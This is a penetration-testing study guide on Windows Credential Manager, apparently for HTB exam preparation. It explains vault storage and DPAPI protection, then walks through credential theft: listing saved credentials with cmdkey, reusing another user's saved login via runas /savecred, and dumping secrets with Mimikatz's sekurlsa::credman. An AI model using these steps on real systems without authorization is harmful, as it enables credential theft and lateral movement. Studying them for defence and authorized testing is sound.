# What is Windows Credential Manager?

Windows **Credential Manager** is a built-in Windows feature introduced in:

- Windows 7
    
- Windows Server 2008 R2
    

Its purpose is to **securely store usernames and passwords** for websites, applications, Windows services, shared folders, remote computers, and cloud services.

Think of it as Windows' own **password manager**.

---

# Windows Credential Manager Architecture

```text
                     User
                       │
                       ▼
            Windows Credential Manager
                       │
      ┌────────────────┼────────────────┐
      │                                 │
      ▼                                 ▼
 Web Credentials               Windows Credentials
      │                                 │
 Websites                    Network Resources
 Edge/IE                     Shared Folders
 Microsoft Accounts          OneDrive
                              Domain Credentials
```

---

# Why Attack Credential Manager?

Credential Manager may contain:

✔ Domain Credentials

✔ OneDrive Credentials

✔ RDP Credentials

✔ Shared Folder Passwords

✔ Service Account Passwords

✔ Microsoft Account Credentials

If successfully extracted, these credentials can provide access to **other systems** without cracking hashes.

---

# Where are Credentials Stored?

Windows stores encrypted credentials inside **Vault folders**.

### User Vaults

```text
%UserProfile%\AppData\Local\Microsoft\Vault\
```

```text
%UserProfile%\AppData\Local\Microsoft\Credentials\
```

```text
%UserProfile%\AppData\Roaming\Microsoft\Vault\
```

---

### System Vaults

```text
%ProgramData%\Microsoft\Vault\
```

```text
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

---

## Vault Storage Diagram

```text
Windows
    │
    ▼
Credential Manager
    │
    ▼
Encrypted Vaults
    │
    ├──────────────┐
    │              │
    ▼              ▼
User Vaults    System Vaults
```

---

# Important File

Every Vault contains

```text
Policy.vpol
```

This file stores

```text
AES Keys
```

Specifically

- AES-128
    
- AES-256
    

These AES keys encrypt every credential stored inside the vault.

---

# Encryption Process

```text
Credential
     │
     ▼
AES Encryption
     │
     ▼
Stored Inside Vault
     │
     ▼
AES Key Stored
Inside Policy.vpol
     │
     ▼
Protected by DPAPI
```

---

# DPAPI Protection

Windows does **NOT** store credentials in plaintext.

Instead

```text
Credential

↓

AES Encrypt

↓

Vault

↓

AES Key

↓

Protected by DPAPI
```

Without the DPAPI Master Key

↓

Credentials cannot be decrypted.

---

# Credential Guard

Modern Windows introduces

```text
Credential Guard
```

Purpose

Protects DPAPI Master Keys

Uses

```text
Virtualization-Based Security (VBS)
```

Diagram

```text
Credential

↓

Vault

↓

DPAPI Key

↓

Credential Guard

↓

Protected Memory
```

---

# Windows Terminology

Microsoft uses different names for the same feature.

|Name|Meaning|
|---|---|
|Credential Manager|User Interface/API|
|Windows Vault|Encrypted Storage|
|Credential Locker|Modern Name|

---

# Types of Credentials

Windows stores two primary credential types.

---

## 1. Web Credentials

Stores

- Website Passwords
    
- Microsoft Accounts
    
- Internet Explorer
    
- Legacy Microsoft Edge
    

Diagram

```text
Website

↓

Credential Manager

↓

Web Credentials

↓

Encrypted
```

---

## 2. Windows Credentials

Stores

- Domain Logins
    
- Shared Folder Credentials
    
- Network Resources
    
- OneDrive
    
- Services
    
- SMB Credentials
    

Diagram

```text
Windows Login

↓

Credential Manager

↓

Windows Credentials

↓

Encrypted
```

---

# Credential Types Summary

|Credential Type|Stores|
|---|---|
|Web Credentials|Website Logins|
|Windows Credentials|Domain, SMB, Services, OneDrive|

---

# Exporting Credential Vaults

Windows allows users to export Credential Manager.

Command

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

This opens

```text
Stored User Names and Passwords
```

Users can

- Backup Credentials
    
- Export to `.crd`
    
- Import on another Windows machine
    

---

# Enumerating Credentials

Tool

```text
cmdkey
```

---

## Current User

```cmd
whoami
```

Example

```text
srv01\sadams
```

---

## List Stored Credentials

```cmd
cmdkey /list
```

Example Output

```text
Currently stored credentials:

Target: WindowsLive:target=virtualapp/didlogical

Type: Generic

User: 02hejubrtyqjrkfi

Target: Domain:interactive=SRV01\mcharles

Type: Domain Password

User: SRV01\mcharles
```

---

# Understanding cmdkey Output

### Target

Resource associated with the credential.

Examples

- Computer
    
- Domain
    
- Website
    

---

### Type

Credential category.

Examples

```text
Generic

Domain Password
```

---

### User

Associated account.

Example

```text
SRV01\mcharles
```

---

### Persistence

Shows whether credentials survive reboot.

Example

```text
Local Machine Persistence
```

Meaning

Credential remains after restarting Windows.

---

# cmdkey Output Diagram

```text
cmdkey /list
      │
      ▼
Target
Type
User
Persistence
```

---

# Important Observation

Example

```text
Target:
WindowsLive:target=virtualapp/didlogical
```

This is

Microsoft Account Credential.

Usually **not useful** during penetration tests.

---

However

```text
Domain:interactive=SRV01\mcharles
```

This is **very valuable**.

It indicates Windows has saved credentials for another user.

---

# Using Saved Credentials

Command

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

What happens?

```text
Stored Credential

↓

runas

↓

Launch CMD

↓

Running as SRV01\mcharles
```

No password prompt is required because Windows retrieves the saved credential automatically.

---

# Extracting Credentials

One of the best tools

```text
Mimikatz
```

---

# Why Mimikatz?

Can extract

✔ Passwords

✔ NTLM Hashes

✔ Kerberos Tickets

✔ Credential Manager Entries

✔ DPAPI Keys

---

# Start Mimikatz

```cmd
mimikatz.exe
```

---

# Enable Debug Privileges

```cmd
privilege::debug
```

Output

```text
Privilege '20' OK
```

Without this

↓

Many credential dumping modules fail.

---

# Dump Credential Manager

Command

```cmd
sekurlsa::credman
```

Diagram

```text
LSASS

↓

Credential Manager

↓

Mimikatz

↓

Dump Credentials
```

---

# Example Output

```text
Username:
mcharles@inlanefreight.local

Domain:
onedrive.live.com

Password:
********
```

This proves Mimikatz successfully decrypted stored credentials.

---

# How Does This Work?

```text
Credential Manager

↓

DPAPI Encryption

↓

LSASS

↓

Mimikatz

↓

Decrypt Credentials
```

---

# Other Credential Dumping Tools

Besides Mimikatz

Windows Credential Manager can also be attacked using

- SharpDPAPI
    
- LaZagne
    
- DonPAPI
    

---

# Tool Comparison

|Tool|Purpose|
|---|---|
|cmdkey|Enumerate Stored Credentials|
|runas|Use Stored Credentials|
|Mimikatz|Dump Credentials|
|SharpDPAPI|DPAPI Attacks|
|LaZagne|Recover Stored Passwords|
|DonPAPI|Remote DPAPI Credential Extraction|

---

# Attack Workflow

```text
Gain Access
      │
      ▼
Enumerate Credentials
(cmdkey /list)
      │
      ▼
Interesting Domain Credential?
      │
      ▼
Use runas /savecred
      │
      ▼
Administrator Access?
      │
      ▼
Run Mimikatz
      │
      ▼
sekurlsa::credman
      │
      ▼
Recover Credentials
```

---

# Credential Manager vs LSASS vs SAM

|Feature|Credential Manager|LSASS|SAM|
|---|---|---|---|
|Website Passwords|✅|❌|❌|
|OneDrive|✅|❌|❌|
|Domain Credentials|✅|✅|❌|
|NTLM Hashes|❌|✅|✅|
|Kerberos Tickets|❌|✅|❌|
|DPAPI Keys|Protected by DPAPI|May Cache Master Keys|❌|

---

# Important Commands

### Open Credential Manager

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

---

### Current User

```cmd
whoami
```

---

### Enumerate Credentials

```cmd
cmdkey /list
```

---

### Use Stored Credential

```cmd
runas /savecred /user:DOMAIN\User cmd
```

---

### Launch Mimikatz

```cmd
mimikatz.exe
```

---

### Enable Debug

```cmd
privilege::debug
```

---

### Dump Credential Manager

```cmd
sekurlsa::credman
```

---

# Memory Tricks

## Credential Types

```text
Web Credentials

↓

Websites

Edge

IE

Microsoft Accounts
```

```text
Windows Credentials

↓

Domain

OneDrive

SMB

Services

Shared Folders
```

---

## Vault Encryption

```text
Credential

↓

AES

↓

Vault

↓

Policy.vpol

↓

DPAPI
```

Remember:

> **Policy.vpol stores the AES encryption keys, and DPAPI protects those keys.**

---

# HTB / Exam Questions

### Where are Windows Vaults stored?

✅ Under the user's and system's **Microsoft\Vault** directories.

---

### Which file stores AES encryption keys?

✅ `Policy.vpol`

---

### Which API protects the AES keys?

✅ **DPAPI**

---

### Which command lists stored credentials?

```cmd
cmdkey /list
```

---

### Which command opens the Stored User Names and Passwords window?

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

---

### Which command launches a program using saved credentials?

```cmd
runas /savecred /user:DOMAIN\User cmd
```

---

### Which Mimikatz module dumps Credential Manager secrets?

```cmd
sekurlsa::credman
```

---

### Which privilege must be enabled before dumping credentials with Mimikatz?

```cmd
privilege::debug
```

---

# 1-Minute Revision Sheet

```text
Credential Manager
        │
        ▼
Stores:
✔ Web Credentials
✔ Windows Credentials

Vault Locations:
%UserProfile%\AppData\...\Vault\
%ProgramData%\Microsoft\Vault\

Encryption:
Credential
   ↓
AES
   ↓
Policy.vpol
   ↓
DPAPI

Commands:
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
runas /savecred /user:DOMAIN\User cmd

Mimikatz:
privilege::debug
sekurlsa::credman

Other Tools:
SharpDPAPI
LaZagne
DonPAPI
```

These notes preserve the important concepts and commands from your material while adding explanations, diagrams, workflows, and exam-focused summaries.